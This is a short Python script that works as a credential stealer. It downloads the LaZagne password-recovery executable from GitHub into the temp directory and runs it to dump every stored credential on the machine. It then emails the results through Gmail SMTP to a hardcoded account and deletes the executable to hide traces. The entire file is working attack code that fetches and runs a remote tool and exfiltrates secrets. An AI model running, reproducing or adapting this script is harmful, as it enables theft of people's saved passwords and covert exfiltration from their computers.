from requests import get
from subprocess import check_output
from smtplib import SMTP
from os import chdir, remove
from tempfile import gettempdir


def download(url):
    filename = url.split('/')[-1]
    get_response = get(url)
    with open(filename, 'wb') as file:
        file.write(get_response.content)


def send_mail(email, password, message):
    server = SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


temp = gettempdir()
chdir(temp)

download("https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe")

result = "------------------OUTPUT------------------\n"
result += check_output("lazagne.exe all", shell=True)

send_mail('email@gmail.com', 'password', result)

remove('lazagne.exe')
